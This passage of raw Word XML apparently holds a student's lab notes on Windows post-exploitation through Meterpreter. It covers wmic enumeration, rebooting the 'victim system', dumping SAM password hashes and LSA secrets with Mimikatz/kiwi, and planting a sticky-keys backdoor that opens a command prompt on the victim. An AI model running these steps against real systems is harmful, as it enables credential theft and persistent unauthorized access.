          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To get user information </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wmic useraccount get name,sid</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E9">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58"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001EB">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89"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001ED">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wmic baseboard get product,manufacturer</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001EE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001EF">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7" name="image32.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image32.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To see the firewall version the command is</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F2">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">netsh firewall show state</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F4">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84" name="image77.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image77.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To reboot the victim system </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Wmic os where Primary=’TRUE’ reboot</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001F9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">This will reboot the victim system : as in my case it is the same system we can not do it .</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001FA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001FB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To check memory information</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001FC">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001FD">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wmic memphysical list brief</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001FE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001FF">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30"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000201">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW IN ORDER TO GET ALL THE PASSWORDS SAVED IN THE SAM FILE WE CAN USE “MIMIKATZ”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000202">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000203">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">FOR THAT WE NEED TO TYPE</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000204">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000205">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Load kiwi</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000206">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Lsa_dump_sam</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000207">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000208">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31" name="image28.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image28.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9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11" name="image16.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image16.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">So we can see everything which are stored in the sam file</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we can also type lsa_dump_secrets to see all the NTLM_hash passwords for local security.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE NEED TO KNOW THE USAGE OF STICKY_KEYS:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000020F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000210">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">For that type background in the meterpreter </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000211">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000212">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then type use post/windows/manage/sticky_keys</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000213">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000214">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="49" name="image67.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image67.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000216">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">If we press “shift” 5 times we will get the command prompt opened up for the victim machine to get things changed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000217">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000218">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
